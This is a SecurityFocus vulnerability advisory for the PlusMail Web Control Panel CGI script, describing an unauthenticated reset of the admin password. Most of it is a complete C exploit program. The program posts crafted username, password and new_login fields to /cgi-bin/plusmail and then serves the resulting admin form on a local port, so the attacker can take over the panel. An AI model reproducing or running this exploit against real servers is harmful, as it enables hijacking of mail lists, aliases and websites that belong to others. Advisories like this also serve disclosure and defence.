source: http://www.securityfocus.com/bid/2653/info
 
PowerScripts PlusMail Web Control Panel is a web-based administration suite for maintaining mailing lists, mail aliases, and web sites. It is reportedly possible to change the administrative username and password without knowing the current one, by passing the proper arguments to the plusmail script. After this has been accomplished, the web console allows a range of potentially destructive activities including changing of e-mail aliases, mailing lists, web site editing, and various other privileged tasks. This can be accomplished by submitting the argument "new_login" with the value "reset password" to the plusmail script (typically /cgi-bin/plusmail). Other arguments the script expects are "username", "password" and "password1", where username equals the new login name, password and password1 contain matching passwords to set the new password to.
 
The specific affected versions have not been determined, and the developer cannot be located. 

/*
 * plusmail cgi exploit 
   - missnglnk 
   greets: herf, ytcracker, mosthated, tino
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/param.h>

extern int      errno;

int
main(int argc, char **argv)
{
	int             argswitch, tport = 80, sockfd, plen, cltlen, lport = 4040;
	char           *target, tmpdata[32768], *password = "default",
	               *username = "jackdidntsetone", pdata[1024], *errcode,
	               *tmpline, *firstline, clntfd, origdata[32768], htmldata[32768];
	struct sockaddr_in rmt, srv, clt;
	struct hostent *he;
	unsigned long   ip;

	if (argc < 5) {
		printf("plusmail cgi exploit by missnglnk\n");
		printf("%s [-h hostname/ip ] [-p target port] [-u username] [-n newpassword] [-l optional local port]\n",
argv[0]);
		return -1;
	}

	while ((argswitch = getopt(argc, argv, "h:p:u:n:l:v")) != -1) {
		switch (argswitch) {
		case 'h':
			if (strlen(optarg) > MAXHOSTNAMELEN) {
				printf("ERROR: Target hostname too long.\n");
				return -1;
			}
			target = optarg;
			break;

		case 'p':
			tport = atoi(optarg);
			break;

		case 'n':
			if (strlen(optarg) > 8) {
				printf("Password length greater than 8 characters.\n");
				return -1;
			}
			password = optarg;
			break;

		case 'u':
			if (strlen(optarg) > 8) {
				printf("Username length greater than 8 characters.\n");
				return -1;
			}
			username = optarg;
			break;

		case 'l':
			lport = atoi(optarg);
			break;

		case '?':
		default:
			printf("plusmail cgi exploit by missnglnk\n");
			printf("%s [-h hostname/ip ] [-p target port] [-u username] [-n newpassword] [-l optional local
port]\n", argv[0]);
			return -1;
			break;
		}
	}

	argc -= optind;
	argv += optind;

	bzero(&rmt, sizeof(rmt));
	bzero(&srv, sizeof(srv));
	bzero(&clt, sizeof(clt));
	bzero(tmpdata, sizeof(tmpdata));
	cltlen = sizeof(clt);

	if ((he = gethostbyname(target)) != NULL) {
		ip = *(unsigned long *) he->h_addr;
	} else if ((ip = inet_addr(target)) == NULL) {
		perror("Error resolving target");
		return -1;
	}

	rmt.sin_family = AF_INET;
	rmt.sin_addr.s_addr = ip;
	rmt.sin_port = htons(tport);

	srv.sin_family = AF_INET;
	srv.sin_addr.s_addr = INADDR_ANY;
	srv.sin_port = htons(lport);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		perror("Error creating socket");
		return -1;
	}

	if (connect(sockfd, (struct sockaddr *) & rmt, sizeof(rmt)) < 0) {
		perror("Error connecting");
		return -1;
	}

	snprintf(pdata, sizeof(pdata), "username=%s&password=%s&password1=%s&new_login=missnglnk", username, password,
password);
	plen = strlen(pdata);

	snprintf(tmpdata, sizeof(tmpdata), "POST /cgi-bin/plusmail HTTP/1.0\n" \
		 "Referer: http://www.pure-security.net\n" \
		 "User-Agent: Mozilla/4.08 [en] (X11; I; SunOS 5.7 missnglnk)\n" \
		 "Host: %s\n" \
		 "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\n" \
		 "Accept-Encoding: gzip\n" \
		 "Accept-Language: en\n" \
		 "Accept-Charset: isp-8859-1,*,utf-8\n" \
		 "Content-type: application/x-www-form-urlencoded\n" \
		 "Content-length: %d\n" \
		 "\n%s\n", target, plen, pdata);

	if (write(sockfd, tmpdata, strlen(tmpdata)) < strlen(tmpdata)) {
		perror("Error writing data");
		return -1;
	}

	bzero(tmpdata, sizeof(tmpdata));
	while (read(sockfd, tmpdata, sizeof(tmpdata)) != 0) {
		strncpy(origdata, tmpdata, sizeof(origdata));
		firstline = strtok(tmpdata, "\n");
		bzero(tmpdata, sizeof(tmpdata));

		if ((errcode = strstr(firstline, "404")) != NULL) {
			printf("plusmail.cgi aint here buddy.\n");
			return -1;
		}

		for ((tmpline = strtok(origdata, "\n")); tmpline != NULL; (tmpline = strtok(NULL, "\n"))) {
			if ((errcode = strstr(tmpline, "<form action")) != NULL) {
//				sprintf(htmldata, "%s<form action = \"http://%s/cgi-bin/plusmail\" method = \"post\">\n",
htmldata, target);
				snprintf(htmldata, sizeof(htmldata), "%s<form action = \"http://%s/cgi-bin/plusmail\" method =
\"post\">\n", htmldata, target);
			} else {
//				sprintf(htmldata, "%s%s\n", htmldata, tmpline);
				snprintf(htmldata, sizeof(htmldata), "%s%s\n", htmldata, tmpline);
			}
		}
	}

	if (close(sockfd) < 0) {
		perror("Error closing socket");
		return -1;
	}

	strncat(htmldata, "\n<br><missnglnk>\0", sizeof(htmldata));

	if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		perror("Error creating socket");
		return -1;
	}

	printf("waiting on port %d...", lport);

	if (bind(sockfd, (struct sockaddr *) & srv, sizeof(srv)) < 0) {
		perror("Error binding to socket");
		return -1;
	}

	if (listen(sockfd, 0) < 0) {
		perror("Error setting backlog");
		return -1;
	}

	if ((clntfd = accept(sockfd, (struct sockaddr *) & clt, &cltlen)) < 0) {
		perror("Error accepting connection");
		return -1;
	}

	printf("connection from %s:%d\n", inet_ntoa(clt.sin_addr), ntohs(clt.sin_port));

	if (!write(clntfd, htmldata, sizeof(htmldata))) {
		perror("Error writing data");
		return -1;
	}

	if (close(clntfd) < 0) {
		perror("Error closing socket");
		return -1;
	}

	printf("\n%s\n", htmldata);
	return 0;
}